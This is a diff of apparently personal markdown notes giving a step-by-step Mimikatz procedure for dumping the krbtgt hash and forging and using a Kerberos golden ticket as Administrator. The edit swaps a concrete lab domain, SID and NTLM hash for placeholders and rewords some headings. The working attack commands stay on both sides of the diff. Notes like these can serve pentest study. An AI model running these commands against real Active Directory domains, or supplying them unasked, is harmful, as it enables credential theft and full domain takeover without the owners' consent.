@@ -9,7 +9,7 @@ Starts mimikatz :
 ```cmd
 privilege::debug 
 ```
-ensure this outputs `privilege '20' ok]` 
+Ensure to have this output : `[privilege '20' ok]` 
 
 ```cmd
 lsadump::lsa /inject /name:krbtgt 
@@ -19,11 +19,12 @@ lsadump::lsa /inject /name:krbtgt
 - To create a silver ticket you need to change the /name value to the service you want.
 
 The output will be useful for the next step :
-["Mimikatz"](images/mimikatz_lsadump.png)
+![[mimikatz_lsadump.png]]
 
-## CREATE THE GOLDEN TICKET
+
+## Generate the ticket
 ```cmd
-Kerberos::golden /user:Administrator /domain:CONTROLLER.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:72cd714611b64cd4d5550cd2759db3f6 /id:500
+Kerberos::golden /user:Administrator /domain:DOMAIN_NAME /sid:DOMAIN_SID /krbtgt:KRBTGT_NTLM_HASH /id:500
 ```
 
 - Administrator : The username
@@ -32,7 +33,7 @@ Kerberos::golden /user:Administrator /domain:CONTROLLER.local /sid:S-1-5-21-4329
 - krbtgt : the primary NTLM hash
 - id : 500 -> idk what is that
 
-## USE THE GOLDEN TICKET
+## Use the ticket
 ```cmd 
 misc::cmd
 ```
